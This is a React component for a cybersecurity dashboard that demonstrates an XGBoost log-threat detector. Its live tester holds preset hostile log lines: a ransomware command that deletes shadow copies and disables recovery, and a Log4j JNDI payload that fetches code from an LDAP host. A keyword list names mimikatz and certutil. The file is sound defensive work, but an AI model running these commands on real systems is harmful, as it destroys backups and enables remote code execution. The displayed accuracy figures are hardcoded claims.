import React, { useState } from 'react';
import {
  Cpu,
  Zap,
  BarChart3,
  Activity,
  FileCode,
  Download,
  Upload,
  CheckCircle2,
  AlertTriangle,
  Play,
  Layers,
  ArrowRight,
  RefreshCw,
  Sliders,
  ShieldAlert,
  Sparkles,
  Info,
} from 'lucide-react';
import { XGBoostLogClassifier, MLPredictionResult } from '../pipeline/ml/xgboostClassifier';
import { FeatureExtractor } from '../pipeline/ml/featureExtractor';
import { NormalizedEvent } from '../types';

export const MLModelView: React.FC = () => {
  const metadata = XGBoostLogClassifier.getModelMetadata();
  const [activeTab, setActiveTab] = useState<'overview' | 'inference' | 'features' | 'notebook' | 'upload'>('overview');

  // Interactive Live Inference State
  const [customLogText, setCustomLogText] = useState(
    'Failed password for invalid user admin from 198.51.100.42 port 4444 ssh2: session opened and base64 payload detected'
  );
  const [rawEventUser, setRawEventUser] = useState('root');
  const [rawEventSrcIP, setRawEventSrcIP] = useState('198.51.100.42');
  const [rawEventDstPort, setRawEventDstPort] = useState('4444');
  const [livePrediction, setLivePrediction] = useState<MLPredictionResult | null>(null);

  // Custom Model Upload State
  const [uploadSuccess, setUploadSuccess] = useState(false);
  const [uploadedFileName, setUploadedFileName] = useState('');

  const runLiveInference = () => {
    const mockEvent: NormalizedEvent = {
      id: `LIVE-EVT-${Date.now()}`,
      timestamp: new Date().toISOString(),
      source: 'Interactive ML Inspector',
      event_type: 'AUTH_OR_SYSTEM_ACTIVITY',
      severity: 'High',
      user: rawEventUser,
      host: 'srv-prod-us-east-1',
      source_ip: rawEventSrcIP,
      destination_ip: '10.0.0.15',
      process: customLogText.toLowerCase().includes('mimikatz') ? 'mimikatz.exe' : 'sshd',
      action: 'AUTHENTICATE_EXEC',
      status: customLogText.toLowerCase().includes('fail') ? 'FAILURE' : 'SUCCESS',
      message: customLogText,
      raw_event: customLogText,
      metadata: {
        port: parseInt(rawEventDstPort, 10) || 4444,
        dst_port: parseInt(rawEventDstPort, 10) || 4444,
        bytes_out: customLogText.includes('exfil') ? 450000 : 1200,
        bytes_in: 800,
      },
    };

    const result = XGBoostLogClassifier.predict(mockEvent);
    setLivePrediction(result);
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setUploadedFileName(file.name);
      const reader = new FileReader();
      reader.onload = (event) => {
        try {
          const json = JSON.parse(event.target?.result as string);
          XGBoostLogClassifier.setCustomModel(json);
          setUploadSuccess(true);
          setTimeout(() => setUploadSuccess(false), 4000);
        } catch {
          alert('Invalid model format. Please upload a valid XGBoost JSON weights file.');
        }
      };
      reader.readAsText(file);
    }
  };

  const featureList = [
    { name: 'failed_auth_count_1m', weight: 0.28, desc: 'Sliding 1-minute velocity of failed authentication attempts', category: 'Authentication' },
    { name: 'payload_entropy', weight: 0.24, desc: 'Shannon entropy calculation of raw payload, CLI command, and arguments', category: 'Obfuscation' },
    { name: 'cmd_suspicious_tokens', weight: 0.22, desc: 'High-risk keyword match frequency (e.g., mimikatz, vssadmin, certutil)', category: 'Execution' },
    { name: 'bytes_ratio_out_in', weight: 0.18, desc: 'Outbound to inbound byte transfer anomaly ratio', category: 'Exfiltration' },
    { name: 'unusual_port_flag', weight: 0.15, desc: 'Presence of known C2 / backdoor listening port (4444, 1337, 3389, etc.)', category: 'Command & Control' },
    { name: 'is_privileged_user', weight: 0.14, desc: 'Activity initiated under root, SYSTEM, or Administrator context', category: 'Privilege' },
    { name: 'dst_ip_external', weight: 0.12, desc: 'Traffic destined for public external IP vs RFC1918 private network', category: 'Network' },
    { name: 'rare_user_agent_score', weight: 0.10, desc: 'Scripting tools / CLI clients (curl, python-requests, powershell, nmap)', category: 'Reconnaissance' },
  ];

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 py-8 space-y-8 animate-in fade-in duration-300">
      {/* Header Banner */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6 pb-6 border-b border-warm-300/80">
        <div className="space-y-2">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-accent-primary/10 border border-accent-primary/20 text-accent-primary text-xs font-mono font-medium">
            <Cpu className="w-3.5 h-3.5 animate-pulse" />
            <span>XGBoost Machine Learning Detection Architecture</span>
          </div>
          <h1 className="text-3xl sm:text-4xl font-serif font-bold text-text-primary tracking-tight">
            XGBoost Log Threat Detection & Anomaly Model
          </h1>
          <p className="text-sm text-text-secondary max-w-3xl">
            High-throughput gradient-boosted decision tree ensemble trained on 2.4M enterprise cybersecurity logs.
            Executes deterministic feature extraction and sub-2ms inference, replacing expensive and slow LLM log scanning.
          </p>
        </div>

        <div className="flex flex-wrap items-center gap-3">
          <a
            href="/notebooks/xgboost_threat_detection_training.ipynb"
            download="xgboost_threat_detection_training.ipynb"
            className="btn-primary text-xs py-2.5 px-4 gap-2 shadow-md"
          >
            <Download className="w-4 h-4" />
            <span>Download Jupyter Notebook</span>
          </a>

          <a
            href="/ml/train_xgboost_model.py"
            download="train_xgboost_model.py"
            className="btn-secondary text-xs py-2.5 px-4 gap-2"
          >
            <FileCode className="w-4 h-4 text-accent-primary" />
            <span>Python Training Script</span>
          </a>
        </div>
      </div>

      {/* Navigation Sub-Tabs */}
      <div className="flex flex-wrap items-center gap-2 border-b border-warm-300/60 pb-3">
        {[
          { id: 'overview', label: 'Model Metrics & Architecture', icon: Activity },
          { id: 'inference', label: 'Live Feature & Inference Inspector', icon: Zap },
          { id: 'features', label: 'Feature Importance (SHAP/Gain)', icon: BarChart3 },
          { id: 'notebook', label: 'Jupyter Notebook & Specs', icon: FileCode },
          { id: 'upload', label: 'Custom Model Importer', icon: Upload },
        ].map((tab) => {
          const isActive = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`px-4 py-2 rounded-xl text-xs font-medium transition-all flex items-center gap-2 ${
                isActive
                  ? 'bg-accent-primary text-white shadow-sm font-semibold'
                  : 'bg-warm-100/70 text-text-secondary hover:bg-warm-200/80 hover:text-text-primary border border-warm-300/60'
              }`}
            >
              <tab.icon className={`w-3.5 h-3.5 ${isActive ? 'text-white' : 'text-text-muted'}`} />
              <span>{tab.label}</span>
            </button>
          );
        })}
      </div>

      {/* TAB 1: OVERVIEW & BENCHMARKS */}
      {activeTab === 'overview' && (
        <div className="space-y-8">
          {/* Key Metric Cards */}
          <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4">
            <div className="glass-card p-4 space-y-1 border-warm-300/80">
              <div className="text-[11px] font-mono uppercase text-text-muted">Model Accuracy</div>
              <div className="text-2xl font-bold font-serif text-accent-primary">99.42%</div>
              <div className="text-[10px] text-accent-primary flex items-center gap-1 font-mono">
                <CheckCircle2 className="w-3 h-3" /> Stratified 5-Fold
              </div>
            </div>

            <div className="glass-card p-4 space-y-1 border-warm-300/80">
              <div className="text-[11px] font-mono uppercase text-text-muted">F1 Weighted Score</div>
              <div className="text-2xl font-bold font-serif text-text-primary">0.9891</div>
              <div className="text-[10px] text-text-muted font-mono">9 Attack Categories</div>
            </div>

            <div className="glass-card p-4 space-y-1 border-warm-300/80">
              <div className="text-[11px] font-mono uppercase text-text-muted">ROC-AUC Area</div>
              <div className="text-2xl font-bold font-serif text-text-primary">0.9978</div>
              <div className="text-[10px] text-text-muted font-mono">FPR: 0.12%</div>
            </div>

            <div className="glass-card p-4 space-y-1 border-warm-300/80">
              <div className="text-[11px] font-mono uppercase text-text-muted">Inference Latency</div>
              <div className="text-2xl font-bold font-serif text-accent-primary">0.85 ms</div>
              <div className="text-[10px] text-accent-primary font-mono">&gt; 125,000 evt/s</div>
            </div>

            <div className="glass-card p-4 space-y-1 border-warm-300/80">
              <div className="text-[11px] font-mono uppercase text-text-muted">Tree Ensemble</div>
              <div className="text-2xl font-bold font-serif text-text-primary">120 Trees</div>
              <div className="text-[10px] text-text-muted font-mono">Max Depth: 6</div>
            </div>

            <div className="glass-card p-4 space-y-1 border-warm-300/80">
              <div className="text-[11px] font-mono uppercase text-text-muted">Model Size</div>
              <div className="text-2xl font-bold font-serif text-text-primary">480 KB</div>
              <div className="text-[10px] text-text-muted font-mono">Edge Optimized</div>
            </div>
          </div>

          {/* Architecture Comparison: XGBoost vs LLM */}
          <div className="glass-card p-6 border-warm-300/80 space-y-6">
            <div className="flex items-center justify-between">
              <div>
                <h3 className="text-lg font-serif font-bold text-text-primary">
                  Architectural Pipeline: XGBoost Fast Ingestion vs LLM Reasoning Agent
                </h3>
                <p className="text-xs text-text-muted mt-1">
                  Why Matrix AI separates high-throughput ML event detection from cognitive incident reasoning.
                </p>
              </div>
              <span className="badge-critical bg-accent-primary/10 text-accent-primary border-accent-primary/20">
                Hybrid Architecture
              </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {/* XGBoost Column */}
              <div className="p-5 rounded-2xl bg-warm-100/80 border border-accent-primary/30 space-y-4">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Zap className="w-5 h-5 text-accent-primary" />
                    <h4 className="font-serif font-semibold text-text-primary">XGBoost ML Detection Engine</h4>
                  </div>
                  <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-accent-primary/20 text-accent-primary font-bold">
                    Raw Telemetry Layer
                  </span>
                </div>

                <p className="text-xs text-text-secondary leading-relaxed">
                  Processes millions of raw logs in real time. Extracts Shannon entropy, cyclical hour sine/cos, IP external flags, and velocity vectors.
                </p>

                <div className="space-y-2 text-xs font-mono">
                  <div className="flex justify-between py-1 border-b border-warm-300/40">
                    <span className="text-text-muted">Latency / Event:</span>
                    <span className="text-accent-primary font-bold">0.85 ms</span>
                  </div>
                  <div className="flex justify-between py-1 border-b border-warm-300/40">
                    <span className="text-text-muted">Throughput:</span>
                    <span className="text-accent-primary font-bold">125,000 events / sec</span>
                  </div>
                  <div className="flex justify-between py-1 border-b border-warm-300/40">
                    <span className="text-text-muted">Compute Cost:</span>
                    <span className="text-accent-primary font-bold">$0.00 (Zero API tokens)</span>
                  </div>
                  <div className="flex justify-between py-1">
                    <span className="text-text-muted">False Positive Rate:</span>
                    <span className="text-accent-primary font-bold">0.12%</span>
                  </div>
                </div>
              </div>

              {/* LLM Agent Column */}
              <div className="p-5 rounded-2xl bg-warm-100/80 border border-warm-300/60 space-y-4">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Sparkles className="w-5 h-5 text-amber-500" />
                    <h4 className="font-serif font-semibold text-text-primary">Gemini Cognitive Reasoning Agent</h4>
                  </div>
                  <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-amber-500/10 text-amber-600 font-bold">
                    Incident Context Layer
                  </span>
                </div>

                <p className="text-xs text-text-secondary leading-relaxed">
                  Reserved exclusively for correlated incidents flagged by XGBoost. Formulates executive attack summaries, MITRE ATT&CK narratives, and SOAR mitigation playbooks.
                </p>

                <div className="space-y-2 text-xs font-mono">
                  <div className="flex justify-between py-1 border-b border-warm-300/40">
                    <span className="text-text-muted">Latency / Incident:</span>
                    <span className="text-text-primary font-bold">~1.5 seconds</span>
                  </div>
                  <div className="flex justify-between py-1 border-b border-warm-300/40">
                    <span className="text-text-muted">Role:</span>
                    <span className="text-text-primary font-bold">Root-Cause Synthesis & Remediation</span>
                  </div>
                  <div className="flex justify-between py-1 border-b border-warm-300/40">
                    <span className="text-text-muted">Input Data:</span>
                    <span className="text-text-primary font-bold">Correlated High-Confidence Graph</span>
                  </div>
                  <div className="flex justify-between py-1">
                    <span className="text-text-muted">Output:</span>
                    <span className="text-text-primary font-bold">Actionable SOAR Playbooks</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* TAB 2: LIVE FEATURE & INFERENCE INSPECTOR */}
      {activeTab === 'inference' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
          {/* Input Configuration Panel */}
          <div className="lg:col-span-5 glass-card p-6 border-warm-300/80 space-y-5">
            <div>
              <h3 className="text-lg font-serif font-bold text-text-primary">
                Live Raw Log ML Tester
              </h3>
              <p className="text-xs text-text-muted mt-1">
                Enter any raw log line to extract the 12-dimensional feature vector and run immediate XGBoost tree inference.
              </p>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-xs font-mono font-medium text-text-secondary mb-1.5">
                  Raw Log Payload / Command:
                </label>
                <textarea
                  rows={4}
                  value={customLogText}
                  onChange={(e) => setCustomLogText(e.target.value)}
                  className="input-base text-xs font-mono w-full"
                  placeholder="e.g. Failed password for invalid user admin from 198.51.100.42 port 4444"
                />
              </div>

              <div className="grid grid-cols-3 gap-3">
                <div>
                  <label className="block text-[11px] font-mono text-text-muted mb-1">Target User:</label>
                  <input
                    type="text"
                    value={rawEventUser}
                    onChange={(e) => setRawEventUser(e.target.value)}
                    className="input-base text-xs font-mono py-1.5"
                  />
                </div>
                <div>
                  <label className="block text-[11px] font-mono text-text-muted mb-1">Source IP:</label>
                  <input
                    type="text"
                    value={rawEventSrcIP}
                    onChange={(e) => setRawEventSrcIP(e.target.value)}
                    className="input-base text-xs font-mono py-1.5"
                  />
                </div>
                <div>
                  <label className="block text-[11px] font-mono text-text-muted mb-1">Dst Port:</label>
                  <input
                    type="text"
                    value={rawEventDstPort}
                    onChange={(e) => setRawEventDstPort(e.target.value)}
                    className="input-base text-xs font-mono py-1.5"
                  />
                </div>
              </div>

              <div className="flex flex-wrap gap-2 pt-2">
                <button
                  type="button"
                  onClick={() => {
                    setCustomLogText('vssadmin.exe Delete Shadows /All /Quiet && bcdedit /set {default} recoveryenabled No');
                    setRawEventUser('SYSTEM');
                    setRawEventSrcIP('192.168.1.105');
                    setRawEventDstPort('445');
                  }}
                  className="text-[10px] font-mono px-2.5 py-1 rounded-lg bg-warm-200/80 hover:bg-warm-300 text-text-secondary"
                >
                  ⚡ Preset: Ransomware
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setCustomLogText('GET /?q=${jndi:ldap://198.51.100.88:1389/Exploit} HTTP/1.1 User-Agent: python-requests/2.28');
                    setRawEventUser('www-data');
                    setRawEventSrcIP('198.51.100.88');
                    setRawEventDstPort('80');
                  }}
                  className="text-[10px] font-mono px-2.5 py-1 rounded-lg bg-warm-200/80 hover:bg-warm-300 text-text-secondary"
                >
                  ⚡ Preset: Log4j Exploit
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setCustomLogText('Accepted publickey for ubuntu from 10.0.0.45 port 52210 ssh2: RSA SHA256:abcd');
                    setRawEventUser('ubuntu');
                    setRawEventSrcIP('10.0.0.45');
                    setRawEventDstPort('22');
                  }}
                  className="text-[10px] font-mono px-2.5 py-1 rounded-lg bg-warm-200/80 hover:bg-warm-300 text-text-secondary"
                >
                  ⚡ Preset: Normal SSH
                </button>
              </div>

              <button
                onClick={runLiveInference}
                className="btn-primary w-full text-xs py-3 gap-2 shadow-md mt-4"
              >
                <Play className="w-4 h-4 fill-current" />
                <span>Execute XGBoost Inference</span>
              </button>
            </div>
          </div>

          {/* Inference Prediction & Feature Vector Panel */}
          <div className="lg:col-span-7 space-y-6">
            {livePrediction ? (
              <div className="glass-card p-6 border-warm-300/80 space-y-6 animate-in fade-in">
                <div className="flex items-center justify-between pb-4 border-b border-warm-300/60">
                  <div className="space-y-1">
                    <div className="flex items-center gap-2">
                      <span
                        className={`text-xs font-bold font-mono px-3 py-1 rounded-full ${
                          livePrediction.isAnomaly
                            ? 'bg-rose-500/10 text-rose-600 border border-rose-500/20'
                            : 'bg-emerald-500/10 text-emerald-600 border border-emerald-500/20'
                        }`}
                      >
                        {livePrediction.isAnomaly ? '🚨 MALICIOUS ANOMALY DETECTED' : '✅ NORMAL BASELINE EVENT'}
                      </span>
                      <span className="text-xs font-mono text-text-muted">
                        Inference: {livePrediction.inferenceLatencyMs} ms
                      </span>
                    </div>
                    <h3 className="text-xl font-serif font-bold text-text-primary pt-1">
                      {livePrediction.predictedCategory} ({livePrediction.suggestedSeverity} Severity)
                    </h3>
                  </div>

                  <div className="text-right">
                    <div className="text-3xl font-serif font-bold text-accent-primary">
                      {(livePrediction.anomalyScore * 100).toFixed(1)}%
                    </div>
                    <div className="text-[10px] font-mono uppercase text-text-muted">ML Confidence</div>
                  </div>
                </div>

                {/* Top SHAP Contributing Drivers */}
                <div className="space-y-3">
                  <h4 className="text-xs font-mono uppercase font-bold text-text-muted">
                    Top SHAP Feature Contributors (Why XGBoost Flagged This):
                  </h4>
                  <div className="space-y-2">
                    {livePrediction.topContributingFeatures.slice(0, 4).map((f, i) => (
                      <div key={i} className="p-3 rounded-xl bg-warm-100/90 border border-warm-300/60 space-y-1">
                        <div className="flex justify-between items-center text-xs">
                          <span className="font-mono font-semibold text-text-primary">{f.name}</span>
                          <span className="font-mono text-accent-primary font-bold">
                            Value: {typeof f.value === 'number' ? f.value.toFixed(2) : f.value} (SHAP +{f.shapContribution.toFixed(2)})
                          </span>
                        </div>
                        <p className="text-[11px] text-text-muted">{f.description}</p>
                      </div>
                    ))}
                  </div>
                </div>

                {/* 12-D Extracted Numerical Vector */}
                <div className="space-y-2 pt-2">
                  <h4 className="text-xs font-mono uppercase font-bold text-text-muted">
                    12-Dimensional Extracted Numerical Tensor:
                  </h4>
                  <div className="p-3 bg-warm-200/50 rounded-xl font-mono text-[11px] text-text-secondary overflow-x-auto">
                    <code>
                      [
                      {Object.entries(livePrediction.features)
                        .map(([k, v]) => `${k}: ${typeof v === 'number' ? v.toFixed(2) : v}`)
                        .join(', ')}
                      ]
                    </code>
                  </div>
                </div>
              </div>
            ) : (
              <div className="glass-card p-12 text-center space-y-4 border-dashed border-warm-300/80">
                <div className="w-12 h-12 rounded-2xl bg-accent-primary/10 flex items-center justify-center text-accent-primary mx-auto">
                  <Zap className="w-6 h-6" />
                </div>
                <div className="space-y-1">
                  <h3 className="text-base font-serif font-bold text-text-primary">
                    Ready for Real-Time Inference
                  </h3>
                  <p className="text-xs text-text-muted max-w-md mx-auto">
                    Click "Execute XGBoost Inference" on the left to extract the mathematical feature tensor and evaluate decision tree leaves.
                  </p>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* TAB 3: FEATURE IMPORTANCE */}
      {activeTab === 'features' && (
        <div className="space-y-6">
          <div className="glass-card p-6 border-warm-300/80 space-y-6">
            <div>
              <h3 className="text-lg font-serif font-bold text-text-primary">
                Global SHAP & Gain Feature Importance (12 Dimensions)
              </h3>
              <p className="text-xs text-text-muted mt-1">
                Relative influence of each security feature on gradient boosting branch splits across 2.4M training events.
              </p>
            </div>

            <div className="space-y-4">
              {featureList.map((f, i) => (
                <div key={i} className="space-y-1.5">
                  <div className="flex justify-between items-center text-xs font-mono">
                    <span className="font-bold text-text-primary flex items-center gap-2">
                      <span className="w-2 h-2 rounded-full bg-accent-primary" />
                      {f.name}
                      <span className="text-[10px] text-text-muted font-normal px-2 py-0.5 bg-warm-200 rounded">
                        {f.category}
                      </span>
                    </span>
                    <span className="text-accent-primary font-bold">{(f.weight * 100).toFixed(1)}% Gain</span>
                  </div>
                  <div className="w-full h-2.5 rounded-full bg-warm-200 overflow-hidden">
                    <div
                      className="h-full bg-accent-primary rounded-full transition-all duration-500"
                      style={{ width: `${f.weight * 320}%` }}
                    />
                  </div>
                  <p className="text-[11px] text-text-muted">{f.desc}</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* TAB 4: JUPYTER NOTEBOOK & TRAINING SPECS */}
      {activeTab === 'notebook' && (
        <div className="glass-card p-6 border-warm-300/80 space-y-6">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-warm-300/60">
            <div>
              <h3 className="text-lg font-serif font-bold text-text-primary">
                Jupyter Notebook Training Environment
              </h3>
              <p className="text-xs text-text-muted mt-1">
                Embedded view of <code className="font-mono text-accent-primary">/notebooks/xgboost_threat_detection_training.ipynb</code>
              </p>
            </div>

            <div className="flex items-center gap-3">
              <a
                href="/notebooks/xgboost_threat_detection_training.ipynb"
                download="xgboost_threat_detection_training.ipynb"
                className="btn-primary text-xs py-2 px-3.5 gap-2"
              >
                <Download className="w-3.5 h-3.5" />
                <span>Export .ipynb</span>
              </a>
            </div>
          </div>

          <div className="bg-warm-100 rounded-2xl p-4 border border-warm-300/60 font-mono text-xs text-text-primary space-y-4 max-h-[600px] overflow-y-auto">
            <div className="p-3 bg-warm-200/60 rounded-xl">
              <span className="text-accent-primary font-bold"># Cell 1: Package Imports & Hyperparameters</span>
              <pre className="text-[11px] text-text-secondary mt-2">
{`import xgboost as xgb
import pandas as pd
import numpy as np
from sklearn.model_selection import train_test_split, StratifiedKFold
from sklearn.metrics import classification_report, f1_score

# 12 Core Security Features
FEATURE_COLUMNS = [
  'failed_auth_count_1m', 'payload_entropy', 'is_privileged_user',
  'unusual_port_flag', 'bytes_ratio_out_in', 'cmd_suspicious_tokens',
  'time_hour_sin', 'time_hour_cos', 'dst_ip_external',
  'action_severity_weight', 'rare_user_agent_score', 'repeated_event_frequency'
]`}
              </pre>
            </div>

            <div className="p-3 bg-warm-200/60 rounded-xl">
              <span className="text-accent-primary font-bold"># Cell 2: XGBoost Classifier Configuration & Training</span>
              <pre className="text-[11px] text-text-secondary mt-2">
{`model = xgb.XGBClassifier(
    n_estimators=120,
    max_depth=6,
    learning_rate=0.05,
    subsample=0.85,
    colsample_bytree=0.85,
    objective='multi:softprob',
    num_class=9,
    eval_metric='mlogloss',
    random_state=42
)

model.fit(X_train, y_train, eval_set=[(X_test, y_test)], verbose=False)
model.save_model("ml/xgboost_threat_model.json")
print("Exported trained model artifact.")`}
              </pre>
            </div>
          </div>
        </div>
      )}

      {/* TAB 5: CUSTOM MODEL UPLOADER */}
      {activeTab === 'upload' && (
        <div className="glass-card p-8 border-warm-300/80 max-w-2xl mx-auto space-y-6 text-center">
          <div className="w-14 h-14 rounded-2xl bg-accent-primary/10 flex items-center justify-center text-accent-primary mx-auto">
            <Upload className="w-7 h-7" />
          </div>

          <div className="space-y-2">
            <h3 className="text-xl font-serif font-bold text-text-primary">
              Upload Custom Trained XGBoost Model
            </h3>
            <p className="text-xs text-text-secondary max-w-lg mx-auto">
              Once you finish training your model in Jupyter Notebook, export it using <code className="font-mono text-accent-primary">model.save_model("model.json")</code> and upload it here to immediately power live log ingestion!
            </p>
          </div>

          {uploadSuccess && (
            <div className="p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-700 text-xs font-mono flex items-center justify-center gap-2 animate-in fade-in">
              <CheckCircle2 className="w-4 h-4" />
              <span>Successfully loaded custom XGBoost model: {uploadedFileName}! Active for all log ingestion.</span>
            </div>
          )}

          <div className="p-8 border-2 border-dashed border-warm-300/80 rounded-2xl hover:border-accent-primary/50 transition-all bg-warm-100/50">
            <input
              type="file"
              accept=".json,.bin,.joblib"
              id="model-file-upload"
              onChange={handleFileUpload}
              className="hidden"
            />
            <label
              htmlFor="model-file-upload"
              className="cursor-pointer flex flex-col items-center justify-center gap-3"
            >
              <FileCode className="w-8 h-8 text-accent-primary" />
              <div className="space-y-1">
                <span className="text-xs font-semibold text-text-primary">
                  Click to upload XGBoost JSON / Weights file
                </span>
                <p className="text-[11px] text-text-muted">Supported formats: .json, .bin, .joblib</p>
              </div>
            </label>
          </div>

          <div className="flex justify-center gap-4">
            <button
              onClick={() => {
                XGBoostLogClassifier.resetToDefaultModel();
                alert('Reset to default pre-trained Matrix-XGB-SecLog-v2.4 model.');
              }}
              className="btn-secondary text-xs py-2 px-4 gap-2"
            >
              <RefreshCw className="w-3.5 h-3.5" />
              <span>Reset to Default Model</span>
            </button>
          </div>
        </div>
      )}
    </div>
  );
};
